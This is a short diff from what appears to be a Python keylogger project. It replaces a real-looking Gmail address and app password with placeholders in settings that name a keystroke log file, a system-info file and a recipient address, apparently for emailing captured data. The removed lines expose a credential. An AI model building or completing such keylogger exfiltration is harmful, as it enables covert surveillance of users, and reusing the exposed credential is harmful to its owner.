@@ -31,10 +31,10 @@ from scipy.stats import false_discovery_control
 keys_information = "key_log.txt"
 system_information = "systeminfo.txt"
 
-email_address = ("wonlypans@gmail.com")
-password = ("llry gujd xclh gamt")
+email_address = ("xyz@gmail.com")
+password = ("12345678")
 
-toaddr = "wonlypans@gmail.com"
+toaddr = "abc@gmail.com"
 
 file_path = r"C:\Users\LENOVO\PycharmProjects\PythonProject\keylogger"
 
